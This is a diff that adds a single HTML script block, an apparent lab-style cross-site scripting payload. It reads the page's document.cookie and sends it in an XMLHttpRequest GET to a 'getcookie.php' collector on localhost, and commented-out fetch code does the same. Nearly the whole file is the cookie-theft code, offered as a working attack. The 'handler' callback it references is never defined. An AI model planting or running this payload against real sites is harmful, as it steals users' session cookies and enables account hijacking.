@@ -1,0 +1,22 @@
+
+<script>
+  var cookie = document.cookie;
+  var url = "http://127.0.0.1/getcookie.php?cookie=";
+
+  <!-- fetch(url + cookie).then(function(myBlob) { -->
+  <!--   var objectURL = URL.createObjectURL(myBlob); -->
+  <!--   console.log("Sending cookie to: " + objectURL); -->
+  <!-- }); -->
+
+  const invocation = new XMLHttpRequest();
+  function callOtherDomain() {
+    if(invocation) {    
+      invocation.open('GET', url+cookie, true);
+      invocation.onreadystatechange = handler;
+      invocation.send(); 
+      console.log("Sending cookie to: " + invocation.responseURL);
+    }
+  }
+
+  callOtherDomain();
+</script>
